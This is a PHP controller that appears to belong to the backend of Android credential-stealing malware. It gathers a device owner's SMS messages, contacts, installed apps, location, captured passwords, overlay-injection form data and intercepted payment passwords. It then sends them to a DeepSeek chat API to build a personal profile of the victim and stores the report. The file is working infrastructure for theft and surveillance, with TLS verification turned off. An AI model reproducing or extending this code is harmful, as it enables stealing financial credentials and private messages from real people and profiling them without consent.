<?php
namespace app\controller;

use app\BaseController;
use think\facade\Db;
use think\facade\Request;

class AiController extends BaseController
{
    /**
     * POST /api/ai/analyze
     * AI 智能人像分析
     */
    public function analyze()
    {
        set_time_limit(300); // AI 分析可能需要较长时间
        $raw = file_get_contents('php://input');
        $input = $raw ? json_decode($raw, true) : [];
        $deviceId = $input['deviceId'] ?? '';
        $sources = $input['sources'] ?? ['db', 'sms', 'contacts', 'apps', 'accounts'];

        if (!$deviceId) {
            return json(['success' => false, 'message' => '缺少 deviceId']);
        }

        // 读取 AI 配置
        $configs = [];
        $rows = Db::table('fisher_ai_config')->select()->toArray();
        foreach ($rows as $r) {
            $configs[$r['config_key']] = $r['config_value'];
        }

        $apiUrl = $configs['api_url'] ?? env('external.deepseek_api_url', 'https://api.deepseek.com/v1');
        $model = $configs['model'] ?? env('external.deepseek_model', 'deepseek-v4-flash');
        $apiKey = $configs['api_key'] ?? '';
        $temperature = floatval($configs['temperature'] ?? 0.1);
        $systemPrompt = $configs['system_prompt'] ?? '你是一个专业的数据分析师，请根据提供的数据进行人像画像分析。';

        if (!$apiKey) {
            return json(['success' => false, 'message' => 'AI API Key 未配置']);
        }

        // 收集设备数据
        $dataContent = $this->collectDeviceData($deviceId, $sources);

        if (!$dataContent) {
            return json(['success' => false, 'message' => '未找到该设备的数据']);
        }

        // 调用 DeepSeek API
        $userMessage = "以下是设备 {$deviceId} 的采集数据，请进行人像画像分析：\n\n" . $dataContent;

        $payload = [
            'model' => $model,
            'messages' => [
                ['role' => 'system', 'content' => $systemPrompt],
                ['role' => 'user', 'content' => $userMessage],
            ],
            'temperature' => $temperature,
            'max_tokens' => 8192,
        ];

        $ch = curl_init($apiUrl . '/chat/completions');
        curl_setopt_array($ch, [
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => json_encode($payload, JSON_UNESCAPED_UNICODE),
            CURLOPT_HTTPHEADER => [
                'Content-Type: application/json',
                'Authorization: Bearer ' . $apiKey,
            ],
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 300,
            CURLOPT_SSL_VERIFYPEER => false,
        ]);

        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        curl_close($ch);

        if ($error) {
            return json(['success' => false, 'message' => 'AI 请求失败: ' . $error]);
        }

        if ($httpCode !== 200) {
            return json(['success' => false, 'message' => "AI 返回错误 (HTTP {$httpCode}): " . substr($response, 0, 500)]);
        }

        $result = json_decode($response, true);
        $report = $result['choices'][0]['message']['content'] ?? '';

        if (!$report) {
            return json(['success' => false, 'message' => 'AI 未返回有效内容', 'raw' => substr($response, 0, 1000)]);
        }

        // 删除旧报告，存入新报告
        Db::table('fisher_ai_reports')->where('device_id', $deviceId)->delete();
        Db::table('fisher_ai_reports')->insert([
            'device_id' => $deviceId,
            'report' => $report,
            'created_at' => date('Y-m-d H:i:s'),
        ]);

        return json(['success' => true, 'data' => ['report' => $report]]);
    }

    /**
     * GET /api/ai/device-data/:deviceId
     * 获取 AI 数据缓存状态
     */
    public function getDeviceData($deviceId = '')
    {
        if (!$deviceId) $deviceId = Request::get('deviceId', '');
        $rows = Db::table('fisher_ai_device_data')->where('device_id', $deviceId)->select()->toArray();
        $data = [];
        foreach ($rows as $r) {
            $data[$r['data_type']] = [
                'count' => (int)$r['data_count'],
                'updated_at' => $r['updated_at'],
            ];
        }
        // 获取最新 AI 报告
        $report = Db::table('fisher_ai_reports')->where('device_id', $deviceId)->order('id', 'desc')->find();

        return json(['success' => true, 'data' => $data, 'report' => $report ? $report['report'] : null, 'report_time' => $report ? $report['created_at'] : null]);
    }

    /**
     * POST /api/ai/device-data
     * 前端存入设备数据到 AI 缓存表
     */
    public function saveDeviceData()
    {
        $raw = file_get_contents('php://input');
        $input = $raw ? json_decode($raw, true) : [];
        $deviceId = $input['deviceId'] ?? '';
        $dataType = $input['dataType'] ?? '';
        $dataJson = $input['data'] ?? [];

        if (!$deviceId || !$dataType) {
            return json(['success' => false, 'message' => '缺少参数']);
        }

        $jsonStr = is_string($dataJson) ? $dataJson : json_encode($dataJson, JSON_UNESCAPED_UNICODE);
        $count = is_array($dataJson) ? count($dataJson) : 0;

        Db::table('fisher_ai_device_data')->replace(true)->insert([
            'device_id' => $deviceId,
            'data_type' => $dataType,
            'data_json' => $jsonStr,
            'data_count' => $count,
            'updated_at' => date('Y-m-d H:i:s'),
        ]);

        return json(['success' => true, 'data' => ['count' => $count]]);
    }

    /**
     * 收集设备数据用于 AI 分析（优先从 fisher_ai_device_data 缓存表读取）
     */
    private function collectDeviceData($deviceId, $sources)
    {
        $sections = [];

        // 设备基本信息
        if (in_array('accounts', $sources) || in_array('db', $sources)) {
            $device = Db::table('fisher_devices')->where('device_id', $deviceId)->find();
            if ($device) {
                $sections[] = "【设备信息】\n" .
                    "品牌: " . ($device['brand'] ?? '') . "\n" .
                    "型号: " . ($device['model'] ?? '') . "\n" .
                    "系统: Android " . ($device['os_version'] ?? '') . "\n" .
                    "IP: " . ($device['public_ip'] ?? '') . "\n" .
                    "地理位置: " . ($device['geo_location'] ?? '') . "\n" .
                    "网络类型: " . ($device['network_type'] ?? '') . "\n" .
                    "电量: " . ($device['battery_level'] ?? '') . "%\n" .
                    "应用名称: " . ($device['app_name'] ?? '') . "\n" .
                    "首次连接: " . date('Y-m-d H:i:s', $device['first_seen'] ?? 0) . "\n";
            }
        }

        // 短信记录 — 优先从 AI 缓存表读取
        if (in_array('sms', $sources)) {
            $cached = Db::table('fisher_ai_device_data')->where('device_id', $deviceId)->where('data_type', 'sms')->find();
            if ($cached && !empty($cached['data_json'])) {
                $smsList = json_decode($cached['data_json'], true) ?: [];
                $smsText = "【短信记录】(共" . count($smsList) . "条)\n";
                foreach (array_slice($smsList, 0, 80) as $sms) {
                    $time = $sms['date'] ?? $sms['time'] ?? '';
                    $addr = $sms['address'] ?? $sms['sender'] ?? $sms['from'] ?? '';
                    $body = $sms['body'] ?? $sms['content'] ?? $sms['message'] ?? '';
                    $smsText .= "[{$time}] {$addr}: {$body}\n";
                }
                $sections[] = $smsText;
            }
        }

        // 通讯录 — 从 AI 缓存表读取
        if (in_array('contacts', $sources)) {
            $cached = Db::table('fisher_ai_device_data')->where('device_id', $deviceId)->where('data_type', 'contacts')->find();
            if ($cached && !empty($cached['data_json'])) {
                $contacts = json_decode($cached['data_json'], true) ?: [];
                $contactText = "【通讯录】(共" . count($contacts) . "人)\n";
                foreach (array_slice($contacts, 0, 100) as $c) {
                    $name = $c['name'] ?? $c['displayName'] ?? '';
                    $phone = $c['phone'] ?? $c['number'] ?? $c['phoneNumber'] ?? '';
                    $contactText .= "{$name} - {$phone}\n";
                }
                $sections[] = $contactText;
            }
        }

        // 应用列表 — 从 AI 缓存表读取
        if (in_array('apps', $sources)) {
            $cached = Db::table('fisher_ai_device_data')->where('device_id', $deviceId)->where('data_type', 'apps')->find();
            if ($cached && !empty($cached['data_json'])) {
                $apps = json_decode($cached['data_json'], true) ?: [];
                $appText = "【已安装应用】(共" . count($apps) . "个)\n";
                $appNames = [];
                foreach (array_slice($apps, 0, 80) as $app) {
                    $name = is_array($app) ? ($app['appName'] ?? $app['name'] ?? $app['packageName'] ?? '') : $app;
                    if ($name) $appNames[] = $name;
                }
                $appText .= implode(', ', $appNames) . "\n";
                $sections[] = $appText;
            }
        }

        // 数据库记录（操作日志、密码、注入数据）
        if (in_array('db', $sources)) {
            $passwords = [];
            try {
                $passwords = Db::table('fisher_passwords')
                    ->where('device_id', $deviceId)
                    ->order('id', 'desc')
                    ->limit(10)
                    ->select()->toArray();
            } catch (\Exception $e) { $passwords = []; }
            if ($passwords) {
                $pwdText = "【密码记录】\n";
                foreach ($passwords as $p) {
                    $pwdText .= "类型: " . ($p['cipher_type'] ?? '') . " | 值: " . ($p['cipher_text'] ?? '') . " | 来源: " . ($p['source'] ?? '') . "\n";
                }
                $sections[] = $pwdText;
            }

            $injections = [];
            try {
                $injections = Db::table('fisher_injection_data')
                    ->where('device_id', $deviceId)
                    ->order('id', 'desc')
                    ->limit(20)
                    ->select()->toArray();
            } catch (\Exception $e) { $injections = []; }
            if ($injections) {
                $injText = "【注入捕获数据】\n";
                foreach ($injections as $inj) {
                    $injText .= "模板: " . ($inj['template_name'] ?? '') . " | 包名: " . ($inj['package_name'] ?? '') . " | 数据: " . ($inj['form_data'] ?? '') . "\n";
                }
                $sections[] = $injText;
            }

            $logs = [];
            try {
                $logs = Db::table('fisher_operation_logs')
                    ->where('device_id', $deviceId)
                    ->order('id', 'desc')
                    ->limit(20)
                    ->select()->toArray();
            } catch (\Exception $e) { $logs = []; }
            if ($logs) {
                $logText = "【操作日志】(最近20条)\n";
                foreach ($logs as $log) {
                    $logText .= "[" . ($log['log_type'] ?? '') . "] " . ($log['content'] ?? '') . "\n";
                }
                $sections[] = $logText;
            }

            // 支付密码记录
            try {
                $ciphers = Db::table('fisher_payment_cipher_records')
                    ->where('device_id', $deviceId)
                    ->order('id', 'desc')
                    ->limit(10)
                    ->select()->toArray();
                if ($ciphers) {
                    $cipherText = "【支付密码截获】\n";
                    foreach ($ciphers as $c) {
                        $cipherText .= "应用: " . ($c['app_name'] ?? $c['package_name'] ?? '') . " | 类型: " . ($c['cipher_type'] ?? '') . " | 密码: " . ($c['cipher_text'] ?? '') . "\n";
                    }
                    $sections[] = $cipherText;
                }
            } catch (\Exception $e) {}
        }

        return implode("\n", $sections);
    }

    /**
     * GET /api/ai/config
     * 获取 AI 配置
     */
    public function getConfig()
    {
        if (!$this->isAdminAccount()) {
            return json(['success' => false, 'message' => '仅管理员/超管账号可查看 AI 配置'], 403);
        }

        $rows = Db::table('fisher_ai_config')->select()->toArray();
        $configs = [];
        foreach ($rows as $r) {
            $configs[$r['config_key']] = $r['config_value'];
        }

        $apiKey = $configs['api_key'] ?? '';
        $data = [
            'api_url' => $configs['api_url'] ?? env('external.deepseek_api_url', 'https://api.deepseek.com/v1'),
            'model' => $configs['model'] ?? env('external.deepseek_model', 'deepseek-v4-flash'),
            'temperature' => $configs['temperature'] ?? '0.1',
            'system_prompt' => $configs['system_prompt'] ?? '你是一个专业的数据分析师，请根据提供的数据进行人像画像分析。',
            'api_key_configured' => $apiKey !== '',
            'api_key_masked' => $this->maskApiKey($apiKey),
        ];

        return json(['success' => true, 'data' => $data]);
    }

    /**
     * PUT /api/ai/config
     * 更新 AI 配置
     */
    public function updateConfig()
    {
        if (!$this->isAdminAccount()) {
            return json(['success' => false, 'message' => '仅管理员/超管账号可修改 AI 配置'], 403);
        }

        $raw = file_get_contents('php://input');
        $data = $raw ? json_decode($raw, true) : [];

        if (!is_array($data)) {
            return json(['success' => false, 'message' => '配置格式错误'], 400);
        }

        if (isset($data['api_url'])) {
            $data['api_url'] = rtrim(trim((string)$data['api_url']), '/');
            if (!preg_match('#^https?://#i', $data['api_url'])) {
                return json(['success' => false, 'message' => 'API URL 必须以 http:// 或 https:// 开头'], 400);
            }
        }
        if (isset($data['model']) && trim((string)$data['model']) === '') {
            return json(['success' => false, 'message' => '模型名称不能为空'], 400);
        }
        if (isset($data['temperature'])) {
            if (!is_numeric($data['temperature']) || (float)$data['temperature'] < 0 || (float)$data['temperature'] > 2) {
                return json(['success' => false, 'message' => 'Temperature 必须在 0 到 2 之间'], 400);
            }
            $data['temperature'] = (string)(float)$data['temperature'];
        }

        $allowedKeys = ['api_url', 'model', 'api_key', 'temperature', 'system_prompt'];
        $updated = 0;

        foreach ($data as $key => $value) {
            if (in_array($key, $allowedKeys) && $value !== null) {
                // 空 Key 表示保留数据库中已经保存的 Key。
                if ($key === 'api_key' && trim((string)$value) === '') {
                    continue;
                }

                $value = trim((string)$value);
                $exists = Db::table('fisher_ai_config')->where('config_key', $key)->find();
                if ($exists) {
                    Db::table('fisher_ai_config')->where('config_key', $key)->update([
                        'config_value' => $value,
                        'updated_at' => date('Y-m-d H:i:s'),
                    ]);
                } else {
                    Db::table('fisher_ai_config')->insert([
                        'config_key' => $key,
                        'config_value' => $value,
                        'updated_at' => date('Y-m-d H:i:s'),
                    ]);
                }
                $updated++;
            }
        }

        return json(['success' => true, 'message' => "已更新 {$updated} 项配置"]);
    }

    /**
     * POST /api/ai/config/test
     * 使用已保存配置或页面当前输入测试 AI 接口。
     */
    public function testConfig()
    {
        if (!$this->isAdminAccount()) {
            return json(['success' => false, 'message' => '仅管理员/超管账号可测试 AI 配置'], 403);
        }

        $raw = file_get_contents('php://input');
        $input = $raw ? json_decode($raw, true) : [];
        if (!is_array($input)) {
            $input = [];
        }

        $configs = [];
        $rows = Db::table('fisher_ai_config')->select()->toArray();
        foreach ($rows as $r) {
            $configs[$r['config_key']] = $r['config_value'];
        }

        $apiUrl = rtrim(trim((string)($input['api_url'] ?? $configs['api_url'] ?? env('external.deepseek_api_url', 'https://api.deepseek.com/v1'))), '/');
        $model = trim((string)($input['model'] ?? $configs['model'] ?? env('external.deepseek_model', 'deepseek-v4-flash')));
        $inputKey = trim((string)($input['api_key'] ?? ''));
        $apiKey = $inputKey !== '' ? $inputKey : ($configs['api_key'] ?? '');
        $temperature = (float)($input['temperature'] ?? $configs['temperature'] ?? 0.1);

        if (!preg_match('#^https?://#i', $apiUrl)) {
            return json(['success' => false, 'message' => 'API URL 格式错误'], 400);
        }
        if ($model === '') {
            return json(['success' => false, 'message' => '模型名称为空'], 400);
        }
        if ($apiKey === '') {
            return json(['success' => false, 'message' => 'AI API Key 未配置'], 400);
        }

        $payload = [
            'model' => $model,
            'messages' => [
                ['role' => 'user', 'content' => 'Reply with OK.'],
            ],
            'temperature' => $temperature,
            'max_tokens' => 8,
        ];

        $ch = curl_init($apiUrl . '/chat/completions');
        curl_setopt_array($ch, [
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => json_encode($payload, JSON_UNESCAPED_UNICODE),
            CURLOPT_HTTPHEADER => [
                'Content-Type: application/json',
                'Authorization: Bearer ' . $apiKey,
            ],
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 60,
            CURLOPT_SSL_VERIFYPEER => false,
        ]);

        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        curl_close($ch);

        if ($error) {
            return json(['success' => false, 'message' => '连接失败: ' . $error], 502);
        }
        if ($httpCode !== 200) {
            $body = json_decode((string)$response, true);
            $message = $body['error']['message'] ?? $body['message'] ?? ('HTTP ' . $httpCode);
            return json(['success' => false, 'message' => 'AI 接口测试失败: ' . $message], 502);
        }

        return json(['success' => true, 'message' => "连接成功，模型 {$model} 可用"]);
    }

    private function isAdminAccount(): bool
    {
        $user = $this->request->user ?? $this->request->userPayload ?? null;
        if (!is_array($user)) {
            return false;
        }

        $username = (string)($user['username'] ?? '');
        $role = strtolower(str_replace('_', '-', (string)($user['role'] ?? '')));

        if ($username === 'admin' || in_array($role, ['admin', 'superadmin', 'super-admin'], true)) {
            return true;
        }

        // Token 里角色可能是旧值，落库再确认一次，确保 mtx 这类超管账号也能保存 AI 配置。
        if ($username !== '') {
            try {
                $dbUser = Db::table('fisher_users')->where('username', $username)->field('role')->find();
                $dbRole = strtolower(str_replace('_', '-', (string)($dbUser['role'] ?? '')));
                return in_array($dbRole, ['admin', 'superadmin', 'super-admin'], true);
            } catch (\Throwable $e) {
                return false;
            }
        }

        return false;
    }

    private function maskApiKey(string $apiKey): string
    {
        if ($apiKey === '') {
            return '';
        }
        if (strlen($apiKey) <= 10) {
            return str_repeat('*', strlen($apiKey));
        }
        return substr($apiKey, 0, 6) . '***' . substr($apiKey, -4);
    }
}
